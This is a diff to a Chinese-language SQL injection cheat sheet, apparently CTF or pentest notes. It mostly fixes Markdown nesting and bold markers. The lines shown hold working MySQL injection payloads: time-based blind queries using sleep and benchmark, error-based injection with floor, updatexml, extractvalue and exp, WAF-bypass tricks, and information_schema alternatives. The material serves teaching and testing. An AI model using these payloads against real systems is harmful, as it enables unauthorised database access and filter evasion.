@@ -131,7 +131,7 @@ SQL 的全名是结构化查询语言。简单来说，它是查询资料库的�
 
 - -  `id=' or if(ascii(substr(database(),1,1))>114,sleep(3),0)%23`
 
--  `**benchmark()**` 
+-  `benchmark()` 
 
 - -  `select * from ctf where id ='1' and if(ascii(substr(database(),1,1))=99,benchmark(10000000,sha(1)),0);`
 
@@ -176,21 +176,19 @@ SQL 的全名是结构化查询语言。简单来说，它是查询资料库的�
 
 报错注入是利用mysql在出错的时候会引出查询信息的特征
 
- 
-
-- - `**floor**` 
+- - `floor` 
 
 - - - `select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);`
 
-- - `**updatexml**` 
+- - `updatexml` 
 
 - - - `select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));`
 
-- - `**extractvalue**` 
+- - `extractvalue` 
 
 - - - `select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));`
 
-- - `**exp**` 
+- - `exp` 
 
 - - - `select * from test where id=1 and exp(~(select * from(select user())a));`
 
@@ -302,8 +300,6 @@ set global  general_log =  on ;
 -  双写绕过 
 -  内联注释`/*!*/` 
 
-- -  
-
 ```plain
 /*!UnIon12345SelEcT*/ 1,user()
 ```
@@ -315,16 +311,14 @@ set global  general_log =  on ;
 -  等于:(`like -> regexp -> <> -> in`) 
 -  `union select` --> `union(select xx);` 
 -  逗号过滤 
-
-- - `limit 1,1` --> `limit 1 offset 1`
-  - `substr(database(),1,1)` --> `substr(database() from 1 for 1)`
-  - `join` --> `?id = 1 union select * from (select 1)a join (select 2)b join (select 3)c#`
-  - `if` -->`case when ...`
+   -  `limit 1,1` --> `limit 1 offset 1`
+   -  `substr(database(),1,1)` --> `substr(database() from 1 for 1)`
+   -  `join` --> `?id = 1 union select * from (select 1)a join (select 2)b join (select 3)c#`
+   -  `if` -->`case when ...` or `&& 、 ||`
 
 -  `limit` 
-
-- - 聚合函数 `group_concat、*.concat`
-  - 加限制条件 `having`、`where`
+   -  聚合函数 `group_concat、*.concat`
+   -  加限制条件 `having`、`where`
 
 -  浮点数 
 
@@ -388,17 +382,16 @@ mysql5.7.*(大概这个范围基本上都可以用)
 
 -  Mysql 
 
-- -  行内注释`/**/` 
+  -  行内注释`/**/` 
   -  换行符`%0d%0a` 
   -  制表符`%09` 
+  -  括号`()` 
+    -  `select(id)from(users);`
+      只能对一些字段，不能对关键字。 
 
-- - -  括号`()` 
+- `+`绕过 
 
-- - - -  `select(id)from(users);`
-        只能对一些字段，不能对关键字。 
-
-- -  `+`绕过 
-  -  反引号 
+  反引号 
 
 ```plain
 select`id`from`student`
@@ -419,29 +412,23 @@ select`id`from`student`
 
 
 
-- `**imformation_schema**` 
+- `imformation_schema` 
+  - `innodb(一般只能获取表名)` 
 
-- - `innodb(一般只能获取表名)` 
-
-- - - `mysql.innodb_table_stats`
+- - `mysql.innodb_table_stats`
     - `innodb_index_stats`v
-
 - - `sys.schema_table_statistics_with_buffer`
   - `sys.schema_auto_increment_columns`
   - `sys.x$schema_flattened_keys`
   - `sys.schema_table_statistics`
   - `sys.schema_tables_with_full_table_scans;`
   - `sys.x$schema_flattened_keys`
-
 - `join`注入 
-
 - - 利用`select`构建一张虚拟表通过`union select`查询我们需要的数据，那么我们就能够过`1,2,3`作为字段名来查询需要的内容。
   - 
-  - `**join**`**报错**
+  - `join`**报错**
   - 
-
 - **利用比较的方法** 
-
 - - `select ((select 1,binary'c')>(select 1,'bzzzzz'));`
 
 #### 2.6 中间件特性
